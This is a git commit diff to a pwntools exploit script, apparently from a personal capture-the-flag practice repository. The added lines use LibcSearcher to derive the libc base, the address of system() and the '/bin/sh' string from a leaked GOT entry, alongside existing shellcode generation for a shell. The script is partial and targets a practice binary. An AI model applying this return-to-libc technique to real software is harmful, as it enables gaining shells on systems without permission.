c6303863abd769201d6d35b6563c19f35bb5da26
Jack Ren <bjrjk@qq.com>
2020-02-08 16:52:56 +0800

    202002081652

--- Pwn/PwnTools.Example.3.py
+++ Pwn/PwnTools.Example.3.py
@@ -1,4 +1,5 @@
 from pwn import *
+from LibcSearcher import *
 context.log_level="debug"
 context(arch="amd64",os="linux")
 
@@ -20,5 +21,10 @@ puts_got = elf.got['puts']
 main_addr = elf.sym['main']
 
 shellcode = asm(shellcraft.sh())
+
+libc = LibcSearcher("read",GOT_read) # read's address in GOT table
+ADDR_LibC_base = GOT_read - libc.dump("read")
+ADDR_system = ADDR_LibC_base + libc.dump("system")
+ADDR_String_Sh = ADDR_LibC_base + libc.dump("str_bin_sh")
 
 conn.interactive()
